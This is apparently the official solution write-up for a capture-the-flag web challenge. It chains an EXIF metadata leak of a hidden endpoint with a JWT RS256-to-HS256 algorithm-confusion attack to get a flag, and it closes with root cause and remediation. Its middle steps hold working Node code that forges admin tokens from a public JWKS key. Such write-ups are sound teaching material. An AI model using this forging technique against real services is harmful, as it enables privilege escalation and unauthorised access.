# SnapSync --- Official Solution

**Primary vulnerability:** JWT algorithm confusion (RS256 → HS256),
custom verifier trusts the `alg` from the token header
(`main-app/src/middleware/auth.js`). **Secondary vulnerability:**
Excessive Data Exposure (API3) --- a server-written internal reference
is embedded in uploaded photos' EXIF `UserComment` and served back
unmodified (`main-app/src/routes/photos.js`). **Chained impact:** Broken
Function-Level Authorization --- the forged `admin` role unlocks a
fixed, undocumented directory-sync endpoint. The endpoint is not listed
in `/api/docs`, not linked from any API response, and not guessable from
any predictable naming scheme --- its path is only ever revealed as a
string inside uploaded photos' EXIF metadata
(`main-app/src/routes/directory.js`). The path itself is not the
security boundary; the `requireRole('admin')` check on it is. An
employee token that somehow learned the path (e.g. by reading the
source) still gets `403`.

## Step-by-step

### 1. Recon

    GET /api/docs
    GET /.well-known/jwks.json

`/api/docs` lists the public API surface (auth, photos, health, JWKS)
--- note that the directory-sync route is **not** in this list; it's not
auto-generated from the router, and only the endpoints meant to be
public are documented there. The API also exposes an RSA public key
(JWK, `kid: snapsync-2026-01`) used to verify RS256 tokens.

### 2. Sign up / log in as a normal employee

    POST /api/auth/signup
    {"username":"marwan","password":"password123"}

Every account created this way is issued role `employee` --- there is no
way to obtain `admin` through normal signup or login.

### 3. Upload a photo, then download it back

    POST /api/photos/upload   (multipart, field name "photo", any JPEG)
    GET  /api/photos/{photoId}

Inspect the returned file's EXIF data (`exiftool`, or any EXIF-reading
library):

    UserComment: internal-ref: /api/directory/8d2158cd-hr-sync

This is the **only** place this path ever appears --- it is not listed
in `GET /api/photos`, not in the upload response, not in `/api/docs`,
and not derivable from any predictable naming scheme.

### 4. Confirm the endpoint is role-gated

    GET /api/directory/8d2158cd-hr-sync
    Authorization: Bearer <employee token>

→ `403 Forbidden — admin role required`. The path is real and reachable,
but the current role isn't sufficient. Escalation is the next step. (Any
attempt to probe or guess this path *before* discovering it via EXIF ---
e.g. `/api/directory/sync`, `/api/directory/sync-photo` --- returns a
plain `404`, with nothing to distinguish it from a nonexistent route.)

### 5. Forge an HS256 token using the RSA public key as the HMAC secret

**⚠ Important tooling note:** the HMAC secret must match the exact bytes
of the PEM file the server holds on disk (SPKI format,
`-----BEGIN PUBLIC KEY-----`). Many common JWK→PEM conversion libraries
(e.g. the npm package `pem-jwk`) instead output **PKCS#1** format
(`-----BEGIN RSA PUBLIC KEY-----`) --- a different byte string for the
same mathematical key. Using such a library will produce a forged token
that silently fails verification, which can look like the vulnerability
doesn't exist. Use Node's own `crypto` module instead, which
reconstructs the exact SPKI PEM the server generated:

    const fs = require('fs');
    const crypto = require('crypto');
    const jwt = require('jsonwebtoken'); // npm install jsonwebtoken

    const jwks = JSON.parse(fs.readFileSync('jwks.json', 'utf8')); // saved from step 1
    const jwk = jwks.keys[0];

    const publicKeyPem = crypto
      .createPublicKey({ key: jwk, format: 'jwk' })
      .export({ type: 'spki', format: 'pem' });

    const forged = jwt.sign(
      { sub: 'marwan', role: 'admin' },
      publicKeyPem,                 // public key used AS the HMAC secret
      { algorithm: 'HS256', keyid: jwk.kid }
    );

    console.log(forged);

(If working outside Node --- e.g. with `jwt_tool` or a Python script ---
any method that reconstructs the **SPKI** PEM form byte-for-byte from
the JWK will work; PKCS#1 will not.)

### 6. Replay the discovered endpoint with the forged token

This is where a proxy tool (Burp Repeater, or plain curl) comes in ---
take the exact request from step 4, swap the `Authorization` header for
the forged token, and resend:

    GET /api/directory/8d2158cd-hr-sync
    Authorization: Bearer <forged HS256 token>

The vulnerable verifier in `middleware/auth.js` reads `alg: HS256` from
the header and HMACs using the same public key bytes the server itself
holds --- the forged signature verifies successfully, and `role: admin`
is accepted.

**Response:**

    {
      "status": "synced",
      "log": { "status": "complete", "flag": "duckurity(marwan_appreciate_you_for_finding_this)" }
    }

## Verified negative cases

-   `GET /api/docs` → lists only the public routes (auth, photos,
    health, JWKS); the directory-sync route is absent from this listing.
-   Guessed/predictable path (`/api/directory/sync`,
    `/api/directory/sync-photo`, etc.) → plain `404 Not Found`,
    indistinguishable from a nonexistent route --- no hint that a
    different path exists.
-   Correct, discovered path with no `Authorization` header →
    `401 Unauthorized`.
-   Correct, discovered path with a valid but non-forged `employee`
    token → `403 Forbidden`.
-   Correct, discovered path with a forged `admin` token → `200`, flag
    returned.
-   The flag is not present in source, configuration, Docker image
    metadata, or any error message --- it lives only in the isolated
    `internal-processing-svc` container, which is not published to the
    host (`docker-compose.yml` uses `expose`, not `ports`) and is only
    reachable from `main-app` over the internal Docker network.

## Root cause

`middleware/auth.js` implements its own JWT verification and branches on
the algorithm named in the *token's own header* instead of pinning the
algorithm the server expects server-side. Because the same RSA public
key material is reused as both the RS256 verification key and, when
`alg: HS256` is claimed, the HMAC secret, anyone with access to the
(intentionally public) JWKS endpoint can forge arbitrary claims.

## Remediation

-   Never derive the verification algorithm from client-supplied token
    data. Pin an explicit allowlist (`algorithms: ['RS256']`) at
    verification time.
-   Prefer a well-maintained JWT library over a hand-rolled verifier,
    and keep it patched --- this challenge's vulnerability is modeled on
    a real 2026 incident, CVE-2026-22817 (Hono JWT/JWKS middleware,
    disclosed 13 Jan 2026, CWE-347, CVSS 8.2 (GHSA-f67f-6cw9-8mq4),
    fixed in hono@4.11.4; see DESIGN.md §6 and SECURITY_REPORT.md §9.15
    for detail), with a related advisory four months later in PyJWT
    (CVE-2026-48526, disclosed 28 May 2026, fixed in 2.13.0).
-   Strip or restrict internal-only metadata (job references, processing
    state) from any file served back to end users; if internal
    bookkeeping must travel with a file, store it out-of-band rather
    than embedding it in user-facing content.
